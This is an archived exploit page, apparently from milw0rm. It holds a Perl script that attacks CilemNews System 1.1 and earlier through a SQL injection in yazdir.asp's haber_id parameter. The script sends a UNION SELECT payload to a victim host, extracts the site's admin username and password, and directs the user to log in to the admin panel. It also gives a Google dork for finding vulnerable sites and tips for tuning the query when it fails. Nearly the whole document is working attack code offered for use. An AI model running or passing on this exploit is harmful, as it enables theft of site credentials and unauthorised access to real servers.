<html><head><title>CilemNews System <= 1.1 (yazdir.asp haber_id) SQL Injection Exploit</title></head><pre>#!/usr/bin/perl
#Method found &amp; Exploit scripted by nukedx
#Contacts &gt; ICQ: 10072 MSN/Main: nukedx@nukedx.com web: www.nukedx.com
#Usage: cilem.pl &lt;victim&gt; &lt;directory&gt;
#Original Advisory: http://www.nukedx.com/?viewdoc=10
#googledork [ inurl:yazdir.asp?haber_id= ] 2.140 pages...
use IO::Socket;
if(@ARGV &lt; 2){
print &quot;
+***********************************************************************+
+Welcome to CilemNews System &lt;= 1.1 (yazdir.asp haber_id) SQL-inject xpl+
+                   Usage: cilem.pl &lt;victim&gt; &lt;directory&gt;                +
+                       Example: cilem.pl sux.com /                     +
+                 googledork [ inurl:yazdir.asp?haber_id= ]             +
+                 Method found &amp; Exploit scripted by nukedx             +
+***********************************************************************+
&quot;;
exit();
}
#Local variables
$cilemserver = $ARGV[0];
$cilemserver =~ s/(http:\/\/)//eg;
$cilemhost = &quot;http://&quot;.$cilemserver;
$port = &quot;80&quot;;
$cilemdir = $ARGV[1];
$cilemtar = &quot;yazdir.asp?haber_id=&quot;;
$cilemfinal = &quot;admin/giris.asp&quot;;
$cilemxp = &quot;1%20union%20select%200,admin,sifre,0,0,0,0,0,0,0,0,0,0,0%20from%20ayarlar%20where%20admin=admin&quot;;
$cilemreq = $cilemhost.$cilemdir.$cilemtar.$cilemxp;
#Writing data to socket
print &quot;+**********************************************************************+\n&quot;;
print &quot;+ Trying to connect: $cilemserver\n&quot;;
$cilem = IO::Socket::INET-&gt;new(Proto =&gt; &quot;tcp&quot;, PeerAddr =&gt; &quot;$cilemserver&quot;, PeerPort =&gt; &quot;$port&quot;) || die &quot;\n+ Connection failed...\n&quot;;
print $cilem &quot;GET $cilemreq\n&quot;;
print $cilem &quot;Host: $cilemserver\n&quot;;
print $cilem &quot;Accept: */*\n&quot;;
print $cilem &quot;Connection: close\n\n&quot;;
print &quot;+ Connected!...\n&quot;;
while($answer = &lt;$cilem&gt;) {
if ($answer =~ /font-weight:700\&quot;&gt;(.*?)&lt;\/b&gt;&lt;\/td&gt;/){ 
print &quot;+ Exploit succeed! Getting admin's information.\n&quot;;
print &quot;+ ---------------- +\n&quot;;
print &quot;+ USERNAME: $1\n&quot;;
}
if ($answer =~ /(.*?)&lt;\/font&gt;&lt;\/td&gt;/) { 
print &quot;+ PASSWORD: $1\n&quot;;
print &quot;+ ---------------- +\n&quot;;
print &quot;+ Lets go $cilemhost$cilemdir$cilemfinal and\n+ Login with this information. \n&quot;;
print &quot;+**********************************************************************+\n&quot;;
exit(); 
}
if ($answer =~ /Internal Server Error/) {
print &quot;+ This version of CilemNews is vulnerable too but default query of SQL-inject doesnt work on it\n&quot;;
print &quot;+ So please edit query by manually adding or removing null datas..\n&quot;;
print &quot;+**********************************************************************+\n&quot;;
exit(); 
}
if ($answer =~ /number of columns/) { 
print &quot;+ This version of CilemNews is vulnerable too but default query of SQL-inject doesnt work on it\n&quot;;
print &quot;+ So please edit query by manually adding or removing null datas..\n&quot;;
print &quot;+**********************************************************************+\n&quot;;
exit(); 
}
}
print &quot;+ Exploit failed :(\n&quot;;
print &quot;+**********************************************************************+\n&quot;;

# milw0rm.com [2006-03-07]</pre></html>